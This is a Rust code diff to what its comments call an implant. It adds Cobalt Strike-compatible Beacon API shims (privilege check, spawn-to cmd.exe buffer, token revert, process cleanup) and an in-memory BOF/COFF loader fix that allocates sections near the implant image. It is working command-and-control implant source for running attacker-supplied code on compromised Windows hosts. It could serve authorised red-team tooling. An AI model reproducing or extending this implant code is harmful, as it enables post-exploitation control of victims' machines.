@@ -265,8 +265,28 @@ fn utohex(mut v: u32, buf: &mut [u8; 9]) -> &str {
 
 /// `void BeaconPrintf(int type, const char *fmt, ...)`.
 /// Captures formatted output into the static buffer.
+///
+/// CRITICAL ABI note: the CS ABI is C-calling-convention varargs. Rust can't
+/// take a real `va_list` in a stable `extern "C"` fn, so we model the varargs
+/// as EXPLICIT trailing args (a1..a6). On Win64 these land in r8 (a1), r9 (a2),
+/// then the stack — exactly where a C vararg caller placed them. We must NOT
+/// take a struct-by-value here: a >16-byte struct would be passed by hidden
+/// pointer (caller-allocates + pointer in r8), which a C vararg caller does
+/// NOT do — that mismatch was the segfault (the BOF put `42` in r8 as the 1st
+/// vararg, but the old signature read r8 as a pointer to a 48-byte VaArgs and
+/// dereferenced garbage). Explicit i64 args match the C vararg register/stack
+/// layout, and format_into only consumes as many as the format string refs.
 #[no_mangle]
-pub unsafe extern "C" fn BeaconPrintf(typ: i32, fmt: *const u8, va: VaArgs) {
+pub unsafe extern "C" fn BeaconPrintf(
+    typ: i32,
+    fmt: *const u8,
+    a1: u64,
+    a2: u64,
+    a3: u64,
+    a4: u64,
+    a5: u64,
+    a6: u64,
+) {
     if fmt.is_null() {
         return;
     }
@@ -279,6 +299,7 @@ pub unsafe extern "C" fn BeaconPrintf(typ: i32, fmt: *const u8, va: VaArgs) {
     if typ == CALLBACK_ERROR {
         out_push_str("[error] ");
     }
+    let va = VaArgs { a1, a2, a3, a4, a5, a6 };
     format_into(fmt_bytes, &va);
     out_push(b"\n");
 }
@@ -384,6 +405,120 @@ pub unsafe extern "C" fn BeaconGetStr(d: *mut DataParseState) -> *const u8 {
     p
 }
 
+/// `int BeaconDataInt(datap *parser)` — read a 4-byte LE int, advance.
+/// Sibling of [`BeaconGetInt`] that takes a `datap` (CS aliases the two names).
+#[no_mangle]
+pub unsafe extern "C" fn BeaconDataInt(d: *mut DataParseState) -> i32 {
+    if d.is_null() || (*d).buffer.is_null() {
+        return 0;
+    }
+    let v = *((*d).buffer as *const i32);
+    (*d).buffer = (*d).buffer.add(4);
+    v
+}
+
+/// `short BeaconDataShort(datap *parser)` — read a 2-byte LE short, advance.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconDataShort(d: *mut DataParseState) -> i16 {
+    if d.is_null() || (*d).buffer.is_null() {
+        return 0;
+    }
+    let v = *((*d).buffer as *const i16);
+    (*d).buffer = (*d).buffer.add(2);
+    v
+}
+
+/// `int BeaconDataLength(datap *parser)` — bytes remaining in the buffer.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconDataLength(d: *mut DataParseState) -> i32 {
+    if d.is_null() || (*d).buffer.is_null() || (*d).original.is_null() {
+        return 0;
+    }
+    let consumed = (*d).buffer as usize - (*d).original as usize;
+    (*d).size - (consumed as i32)
+}
+
+/// `BOOL BeaconIsAdmin()` — delegate to the hostinfo token-elevation check.
+/// Returns 1 if the implant is running elevated, else 0.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconIsAdmin() -> i32 {
+    crate::hostinfo::is_admin() as i32
+}
+
+/// `char *BeaconGetSpawnTo(BOOL x86)` — return a writable "cmd.exe" buffer the
+/// BOF can pass to CreateProcess. The buffer is static so it persists across
+/// the call (CS's contract: the pointer is valid until the BOF returns). The
+/// `x86` arg selects an x86 path in future builds; v1 always returns the native
+/// cmd.exe.
+///
+/// CRITICAL: the buffer must be WRITABLE — community BOFs commonly mutate the
+/// spawn-to path to splice command-line arguments. A `static &[u8]` would back
+/// the slice in read-only `.rdata` and AV on write; this uses a `static mut`
+/// `[u8; N]` (`.data`, writable). Re-initialize on each call so a BOF that
+/// scribbled args last time doesn't see stale garbage.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconGetSpawnTo(_x86: i32) -> *mut u8 {
+    // Writable static buffer (lives in .data, not .rdata). Re-stamped each call
+    // so a prior BOF's mutations don't leak into the next caller.
+    static mut SPAWN: [u8; 28] = [0; 28];
+    const TEMPLATE: &[u8; 28] = b"C:\\Windows\\System32\\cmd.exe\0";
+    // SAFETY: single-threaded (beacon loop); SPAWN is only touched here.
+    unsafe {
+        core::ptr::copy_nonoverlapping(TEMPLATE.as_ptr(), core::ptr::addr_of_mut!(SPAWN).cast::<u8>(), 28);
+        core::ptr::addr_of_mut!(SPAWN).cast::<u8>()
+    }
+}
+
+/// `void BeaconRevertToken()` — drop any impersonation, revert to self.
+/// v1: the implant doesn't yet maintain an impersonation handle (the postex
+/// token module is planned), so this is a documented no-op that lets a BOF
+/// referencing it load and run without an unresolved-symbol failure.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconRevertToken() {}
+
+/// `void BeaconCleanupProcess(PROCESS_INFORMATION *p)` — close the handles in a
+/// PROCESS_INFORMATION a BOF got from BeaconSpawnTemporaryProcess. v1 closes
+/// hProcess + hThread via the resolved CloseHandle (best-effort).
+#[no_mangle]
+pub unsafe extern "C" fn BeaconCleanupProcess(pi: *mut core::ffi::c_void) {
+    if pi.is_null() {
+        return;
+    }
+    // PROCESS_INFORMATION layout (Win64): HANDLE hProcess, hThread; DWORD pid, tid.
+    // Offsets 0 and 8 are the two handles.
+    type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
+        let close: CloseHandle = core::mem::transmute(addr);
+        let base = pi as *const usize;
+        let h_proc = *base;
+        let h_thread = *base.add(1);
+        if h_proc != 0 {
+            let _ = close(h_proc as *mut core::ffi::c_void);
+        }
+        if h_thread != 0 {
+            let _ = close(h_thread as *mut core::ffi::c_void);
+        }
+    }
+}
+
+/// `void BeaconInformation(beaconInfo *info)` — fill a small struct with
+/// implant metadata (pid, user, host, arch, is_admin). The CS struct layout
+/// varies; v1 writes a minimal {pid, is_admin} prefix and leaves the rest for a
+/// documented future extension once the full struct is pinned down.
+#[repr(C)]
+pub struct BeaconInfo {
+    pub pid: u32,
+    pub is_admin: i32,
+}
+#[no_mangle]
+pub unsafe extern "C" fn BeaconInformation(info: *mut BeaconInfo) {
+    if info.is_null() {
+        return;
+    }
+    (*info).pid = crate::hostinfo::pid();
+    (*info).is_admin = crate::hostinfo::is_admin() as i32;
+}
+
 // ============================================================================
 // Symbol resolver: defined (in-image) symbols first, then Beacon-API externals.
 // ============================================================================
@@ -426,9 +561,50 @@ fn beacon_api_addr(name: &str) -> Option<u64> {
         "BeaconGetInt" => addr_of(BeaconGetInt as *const ()),
         "BeaconGetShort" => addr_of(BeaconGetShort as *const ()),
         "BeaconGetStr" => addr_of(BeaconGetStr as *const ()),
+        "BeaconDataInt" => addr_of(BeaconDataInt as *const ()),
+        "BeaconDataShort" => addr_of(BeaconDataShort as *const ()),
+        "BeaconDataLength" => addr_of(BeaconDataLength as *const ()),
+        "BeaconIsAdmin" => addr_of(BeaconIsAdmin as *const ()),
+        "BeaconGetSpawnTo" => addr_of(BeaconGetSpawnTo as *const ()),
+        "BeaconRevertToken" => addr_of(BeaconRevertToken as *const ()),
+        "BeaconCleanupProcess" => addr_of(BeaconCleanupProcess as *const ()),
+        "BeaconInformation" => addr_of(BeaconInformation as *const ()),
         _ => return None,
     };
     Some(addr)
+}
+
+/// Allocate `sz` bytes within ±2 GiB of `anchor` so REL32 relocations from the
+/// BOF to the implant image (Beacon-API shims) don't overflow. VirtualAlloc
+/// with a non-null lpAddress only succeeds if the region is free; we probe
+/// downward from `anchor - step` in 1 MiB steps (staying above anchor-2GiB),
+/// then fall back to a null hint if nothing near grants.
+///
+/// # Safety
+/// `alloc` must be the resolved kernel32 VirtualAlloc.
+unsafe fn alloc_near(
+    alloc: VirtualAllocFn,
+    anchor: usize,
+    sz: usize,
+) -> *mut c_void {
+    const PAGE: usize = 0x1000;
+    const STEP: usize = 1 << 20; // 1 MiB probe stride
+    const WINDOW: usize = (2u64 << 30) as usize; // 2 GiB REL32 reach
+    // Start probing just below the anchor, walking down.
+    let mut hint = (anchor & !(PAGE - 1)).saturating_sub(STEP);
+    let floor = anchor.saturating_sub(WINDOW);
+    let mut tries = 0;
+    while hint > floor && tries < 64 {
+        let p = alloc(hint as *mut c_void, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if !p.is_null() {
+            return p;
+        }
+        hint = hint.saturating_sub(STEP);
+        tries += 1;
+    }
+    // Fall back to the kernel's choice (REL32 may overflow, but at least we
+    // return a region rather than failing outright).
+    alloc(ptr::null_mut(), sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
 }
 
 // ============================================================================
@@ -482,20 +658,22 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
         None => return Response::Err(String::from("VirtualProtect unresolved")),
     };
 
+    // Anchor near the implant image so REL32 calls from BOF .text to the
+    // Beacon-API shims (in the implant image) span < 2 GiB. Without this,
+    // VirtualAlloc(NULL,...) can place the BOF 100+ TB from the implant and
+    // every REL32 call/lea into a shim overflows the 32-bit displacement →
+    // the call jumps to garbage → segfault. We probe a hint address derived
+    // from a local function's address (a stand-in for the image base), walking
+    // downward in 1 MiB steps until VirtualAlloc grants a region.
+    let anchor = beacon_api_addr("BeaconPrintf").unwrap_or(0x10000) as usize;
+
     // 1. Allocate each section as its own RW region; copy raw bytes.
     let mut bases: Vec<u64> = Vec::with_capacity(coff.sections.len());
     let mut sizes: Vec<usize> = Vec::with_capacity(coff.sections.len());
     let mut is_code: Vec<bool> = Vec::with_capacity(coff.sections.len());
     for s in &coff.sections {
         let sz = page((s.virtual_size.max(s.raw.len() as u32)) as usize).max(PAGE_SIZE);
-        let base = unsafe {
-            alloc(
-                ptr::null_mut(),
-                sz,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE, // RW, NOT RWX
-            )
-        };
+        let base = unsafe { alloc_near(alloc, anchor, sz) };
         if base.is_null() {
             return Response::Err(String::from("VirtualAlloc failed"));
         }
